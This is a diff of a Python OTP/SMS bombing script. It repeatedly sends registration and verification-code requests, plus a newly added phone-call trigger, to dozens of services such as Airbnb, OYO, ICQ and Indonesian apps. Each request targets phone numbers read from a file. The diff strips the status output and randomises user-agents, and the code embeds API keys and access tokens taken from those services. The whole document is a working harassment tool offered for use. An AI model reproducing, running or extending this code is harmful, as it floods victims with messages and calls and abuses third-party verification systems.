@@ -25,10 +25,6 @@ class spam:
         for x in range(6):
             sia = requests.post(
                 "https://api-prod.diqit.io/customer/v1/customer/register", headers=hd, json=dat)
-        if 'error' in sia:
-            print('no '+nom+'~> gagal')
-        else:
-            print('no '+nom+'~> sukses')
 
     def mypoin(nom):
         url = 'https://mypoin.id/register/validate-phone-number'
@@ -44,10 +40,6 @@ class spam:
                    "name": "csrfmiddlewaretoken"})
         e = r.post(otp, headers=uatp, data={
                    "phone": "62"+nom, "csrfmiddlewaretoken": c["value"]}).text
-        if e == '{"status": "ok"}':
-            print('no '+nom+'~> sukses')
-        else:
-            print('no '+nom+'~> gagal')
 
     def map(nom):
         hd = {
@@ -58,10 +50,6 @@ class spam:
         for x in range(5):
             pil = requests.post(
                 "https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=hd)
-        if 'error' in pil:
-            print('no '+nom+'~> gagal')
-        else:
-            print('no '+nom+'~> sukses')
 
     def icq(nom):
         url = 'https://u.icq.net/api/v14/rapi/auth/sendCode'
@@ -79,11 +67,6 @@ class spam:
         dat = json.dumps({"reqId": "64708-1593781791", "params": {"phone": "62"+nom,
                          "language": "en-US", "route": "sms", "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}})
         a = requests.post(url, headers=hd, data=dat).text
-        b = json.loads(a)
-        if b['status']['code'] != 20000:
-            print('no '+nom+'~> gagal')
-        else:
-            print('no '+nom+'~> sukses')
 
     def adakami(nom):
         hd = {
@@ -112,10 +95,6 @@ class spam:
         for spem in range(5):
             a = r.post("https://api.adakami.id/adaKredit/pesan/kodeVerifikasi",
                        data=datjson, headers=hd, timeout=10).text
-        if (a == '{"result":-1,"resultMessage":"Permintaan kode verifikasi sudah melebihi batas. Silakan coba lagi besok.","content":null}') or (a == '{"result":-1,"resultMessage":"Gagal abang jago","content":null}'):
-            print('no '+nom+'~> gagal')
-        else:
-            print('no '+nom+'~> sukses')
 
     def coowry(nom):
         url = 'https://www.coowry.com/arlethdesign'
@@ -139,11 +118,6 @@ class spam:
         a = r.get(url, headers={'user-agent': ua.random}).cookies
         b = r.post(spam, headers=hd, cookies={
                    '_cwpeople_keyle_key': a["_cwpeople_key"]}, data=jsn).text
-        c = json.loads(b)["type"]
-        if 'ok' in c:
-            print('no '+nom+'~> sukses')
-        else:
-            print('no '+nom+'~> gagal')
 
     def iuga(nom):
         pis = nom.replace("+62", "")
@@ -155,11 +129,6 @@ class spam:
             c = b.find("meta", attrs={"name": "csrf-token"})
             d = r.post('https://www.iuiga.com/login/send-register-code', headers={'user-agent': ua.random}, data={
                        "_csrf": c["content"], "phone": pis, "phone_code": "+62", "is_login": "0"}).text
-            if 'success' in d:
-
-                print('no '+nom+'~> sukses')
-            else:
-                print('no '+nom+'~> gagal')
 
     def fav(nom):
         hd = {
@@ -177,10 +146,6 @@ class spam:
         dat = {'phone': '62'+nom}
         x = requests.post("https://api.myfave.com/api/fave/v3/auth",
                           data=json.dumps(dat), headers=hd).text
-        if 'error' in x:
-            print('no '+nom+'~> gagal')
-        else:
-            print('no '+nom+'~> sukses')
 
     def suplai(nom):
         hd = {
@@ -196,21 +161,12 @@ class spam:
         for x in range(5):
             x = requests.post(
                 "https://api.sooplai.com/customer/register/otp/request", data=dat, headers=hd)
-        if 'error' in x:
-            print('no '+nom+'~> gagal')
-        else:
-            print('no '+nom+'~> sukses')
 
     def chataja(nom):
         data = json.dumps(
             {"user": {"app_id": "kiwari-prod", "phone_number": "62"+nom}})
         a = requests.post('https://api.chataja.co.id/api/v2/auth_nonce', data=data, headers={"Accept": "application/json, text/plain, */*", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive", "Content-Length": "65", "Content-Type": "application/json;charset=UTF-8", "Host": "api.chataja.co.id",
                                                                                              "Origin": "https://web.chataja.co.id", "Referer": "https://web.chataja.co.id/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"}).text
-        b = json.loads(a)["data"]
-        if b:
-            print('no '+nom+'~> sukses')
-        else:
-            print('no '+nom+'~> gagal')
 
     def depop(nom):
         hd = {'Host': 'webapi.depop.com', 'content-length': '49', 'accept': 'application/json, text/plain, */*', 'origin': 'https://signup.depop.com', 'save-data': 'on',
@@ -220,10 +176,6 @@ class spam:
         for x in range(3):
             y = requests.put(
                 "https://webapi.depop.com/api/auth/v1/verify/phone", headers=hd, data=datjs)
-        if 'error' in y.text:
-            print('no '+nom+'~> gagal')
-        else:
-            print('no '+nom+'~> sukses')
 
     def ruparupa(nom):
         url = 'https://wapi.ruparupa.com/auth/check-otp-auth'
@@ -264,11 +216,6 @@ class spam:
         dataurl2json = json.dumps(dataurl2)
         a = requests.post(url, headers=hdurl, data=dataurljson).text
         b = requests.post(url2, headers=hdurl2, data=dataurl2json).text
-        c = json.loads(b)
-        if c['message'] == 'success':
-            print('no '+nom+'~> sukses')
-        else:
-            print('no '+nom+'~> gagal')
 
     def dekoruma(nom):
         data = json.dumps({"phoneNumber": "+62"+nom, "platform": "wa"})
@@ -276,18 +223,10 @@ class spam:
         for x in range(1):
             cal = r.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",
                          headers={"content-type": "application/json", "user-agent": ua.random}, data=data).text
-        if '' in cal:
-            print('no '+nom+'~> sukses')
-        else:
-            print('no '+nom+'~> gagal')
 
     def jag(nom):
         p = requests.get("https://id.jagreward.com/member/verify-mobile/"+nom)
         y = json.loads(p.text)
-        if y["message"] == 'Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.':
-            print('no '+nom+'~> sukses')
-        else:
-            print('no '+nom+'~> gagal')
 
     def airbnb(nom):
         head = {
@@ -308,12 +247,8 @@ class spam:
         dat = json.dumps(
             {"phoneNumber": "62"+nom, "workFlow": "GLOBAL_SIGNUP_LOGIN", "otpMethod": "TEXT"})
         for x in range(5):
-            cal = requests.post(
+            requests.post(
                 "https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=US&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id", data=dat, headers=head)
-        if 'internationalPhoneNumber' in cal.text:
-            print('no '+nom+'~> sukses')
-        else:
-            print('no '+nom+'~> gagal')
 
     def kelaspintar(nom):
         r = requests.Session()
@@ -363,10 +298,6 @@ class spam:
         }
         y = r.post("https://www.alodokter.com/login-with-phone-number",
                    headers=hd, json={"user": {"phone": "0"+nom}})
-        if y.json()['status'] == 'success':
-            print('no '+nom+'~> sukses')
-        else:
-            print('no '+nom+'~> gagal')
 
     def prosehat(nom):
         head = {
@@ -378,12 +309,8 @@ class spam:
             'referer': 'https://www.prosehat.com/akun',
         }
         dat = {'phone_or_email': '0'+nom, 'action': 'ajaxverificationsend'}
-        ng = requests.post(
+        requests.post(
             'https://www.prosehat.com/wp-admin/admin-ajax.php', data=dat, headers=head)
-        if "token" in ng.text:
-            print('no '+nom+'~> sukses')
-        else:
-            print('no '+nom+'~> gagal')
 
     def theharvest(nom):
         hd = {
@@ -412,12 +339,8 @@ class spam:
 
     def redbus(nom):
         for i in range(2):
-            kil = requests.get("https://m.redbus.id/api/getOtp?number=" +
+            requests.get("https://m.redbus.id/api/getOtp?number=" +
                                nom+"&cc=62&whatsAppOpted=true").text
-        if 'OTP' in kil:
-            print('no '+nom+'~> sukses')
-        else:
-            print('no '+nom+'~> gagal')
 
     def olx(nom):
         head = {
@@ -461,11 +384,6 @@ class spam:
         dat = json.dumps(dit)
         r = requests.Session()
         a = r.post(url, headers=hd, data={"data": dat}).text
-        b = json.loads(a)["code"]
-        if b == 0:
-            print('no '+nom+'~> sukses')
-        else:
-            print('no '+nom+'~> gagal')
 
     def matahari(nom):
         r = requests.Session()
@@ -492,9 +410,9 @@ class spam:
             yu = r.post(
                 "https://thor.matahari.com/MatahariMobileAPI/register", headers=hd, data=datj)
         if 'Success' in yu.text:
-            print('no '+nom+'~> sukses')
+            print('')
         else:
-            print('no '+nom+'~> gagal')
+            print('')
 
     def iviru(nom):
         r = requests.Session()
@@ -556,7 +474,7 @@ class spam:
             "consumer_host": "https://www.oyorooms.com",
             "accept-language": "id",
             "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
+            "User-Agent": ua.random,
             "Content-Type": "application/json",
             "accept": "*/*",
             "origin": "https://www.oyorooms.com",
@@ -567,11 +485,6 @@ class spam:
                           "nod": "4", "send_otp": "true", "devise_role": "Consumer_Guest"})
         y = r.post(
             "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", headers=hd, data=dat)
-        y1 = json.loads(y.text)["otp_sent"]
-        if y1 == True:
-            print('no '+nom+'~> sukses')
-        elif y1 == False:
-            print('no '+nom+'~> gagal')
 
     def jenius(nom):
         r = requests.Session()
@@ -613,7 +526,7 @@ class spam:
             "Accept": "application/json",
             "Content-Type": "application/json",
             "X-Company-Name": "odi",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; IPhone Xr) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
+            "User-Agent": ua.random,
             "user-platform": "mobile",
             "X-Frontend-Type": "mobile",
             "Origin": "https://m.ruparupa.com",
@@ -625,7 +538,13 @@ class spam:
                            "channel": "chat", "email": "", "customer_id": "0", "is_resend": 0})
         send1 = requests.post(
             "https://wapi.ruparupa.com/auth/generate-otp", data=datt, headers=uaa)
-        print(" [Rupa] Nomor ~+> " + no + (send1.json()["message"]))
+
+    def tel(nom):
+        url = "https://id.jagreward.com/member/verify-mobile/"
+        ua = {'Host': "id.jagreward.com", 'Connection': "keep-alive",
+              'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36'}
+        at = {"method": "CALL", "countryCode": "id", }
+        send = requests.post(url+nom, headers=ua, data=at)
 
 
 file = panggil()
@@ -636,7 +555,7 @@ for no in ojk:
     if len(nom) <= 10:
         no = nom.replace(nom, '00000000000')
         spam.oyo(no)
-    else:
+    elif len(nom) >= 10:
         spam.icq(nom)
         spam.adakami(nom)
         spam.iuga(nom)
@@ -646,5 +565,6 @@ for no in ojk:
         spam.redbus(nom)
         spam.olx(nom)
         spam.rupa(nom)
+        spam.tel(nom)
         print(nom + " ~> Sudah selesai diproses\n\n")
 ojk.close()
